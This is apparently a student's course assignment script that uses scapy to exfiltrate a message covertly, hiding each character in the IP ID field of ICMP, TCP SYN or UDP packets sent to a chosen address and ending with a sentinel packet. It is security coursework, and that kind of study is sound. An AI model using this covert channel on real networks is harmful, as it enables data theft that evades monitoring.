#!/usr/bin/env python

###########################################################
#Author: Shruti Sonawane
#CSE 545: Assignment 2: Data exfiltration via IP datagrams
###########################################################

import sys
import os
import random
import logging
from scapy.all import *

logging.getLogger("scapy").setLevel(1)

def GenerateRandom():
  rand = random.randint(0,127)             
  return rand

#function that flips the first binary bit of a given int to 1 and returns the changed int value
def FirstBitFlip(numstr):
  retbin = ""
  binary = bin(int(str(numstr), 10))[2:].zfill(13)
  #print binary
  if(binary[:1] == "0"):
     retbin += "1"
  else:
     retbin += binary[:1]
  retbin += binary[1:]
  #print retbin
  rethex = int(retbin,2)                     #hex(int(retbin,2))
  return rethex         

def GenerateNewID(char,fakeid):
  char_bin = bin(int(char))[2:].zfill(8)
  fakeid_bin = bin(int(fakeid))[2:].zfill(8)
  newid= str(char_bin)+str(fakeid_bin)
  retid = int(newid,2)
  return retid

#Reading the parameters from command line
dest_ip = str(sys.argv[1])
interface = str(sys.argv[2])
msg_type = str(sys.argv[3])
msg = str(sys.argv[4])

fab_id = GenerateRandom()
#print("fab_id: "+str(fab_id))
a=0

#loop through each character in msg
for x,char in enumerate(msg):
   new_id = GenerateNewID(str(ord(char)),str(fab_id))                                         
 
   #if msg type is 0: we need to send an ICMP echo request
   if (msg_type == "0"):
       pkt = Ether()/IP(id=int(new_id),dst=dest_ip,frag=a)/ICMP()    

   #else if msg type is 1: we need to send a TCP SYN packet to port 80
   elif (msg_type == "1"):
       pkt = Ether()/IP(id=int(new_id),dst=dest_ip,frag=a)/TCP(dport=80,flags='S')

   #else if msg type is 2: we need to send a UDP packet to port 53
   elif (msg_type == "2"):
       pkt = Ether()/IP(id=int(new_id),dst=dest_ip,frag=a)/UDP(dport=53)

   sendp(pkt,iface=interface) 
   #pkt.show()
   a+=1
#print a
a=FirstBitFlip(a)
sentinal = Ether()/IP(id=int(new_id),dst=dest_ip,frag=a)
sendp(sentinal,iface=interface)



 
